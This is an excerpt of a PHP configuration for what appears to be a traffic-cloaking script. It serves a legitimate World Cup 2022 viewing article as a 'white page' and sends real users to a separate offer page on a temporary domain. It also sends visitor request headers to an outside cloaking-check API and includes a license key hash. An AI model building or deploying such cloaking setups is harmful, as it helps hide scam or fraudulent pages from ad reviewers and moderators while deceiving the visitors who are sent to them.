...
$config['default_white_page'] = 'https://www.digitaltrends.com/home-theater/how-to-watch-world-cup-2022-qatar/';

/* PHP/HTML file or URL offer used for real users */
$config['default_offer_page'] = 'http://worldcup2022qatar.j32coepka8-yk26ednmn379.p.temp-site.link/worldcup.php';
...
$config['lisence_key'] = '$2y$10$R6QuORbcL7Ww2iJtOeAOyuFfY9BtUUivVgXdxGzTliVlFR0.iwJX.';
/*===========================================================================================================*/
...
$cloackedData = cloacked("https://nugicakep.site/api/process/check", $stringHeader);
